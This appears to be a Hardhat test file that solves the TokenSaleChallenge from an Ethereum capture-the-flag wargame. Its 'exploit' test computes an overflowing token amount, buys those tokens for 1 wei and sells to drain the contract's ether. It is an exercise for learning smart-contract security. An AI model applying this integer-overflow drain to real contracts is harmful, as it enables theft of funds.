import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {  
    const overflowTokens = (BigInt(2) ** BigInt(256)) / BigInt(1e18) + BigInt(1);  
    
    await target.buy(overflowTokens, {  
        value: 1, 
    });  
    await target.sell(overflowTokens);  
    expect(await target.isComplete()).to.equal(true);
});  

});
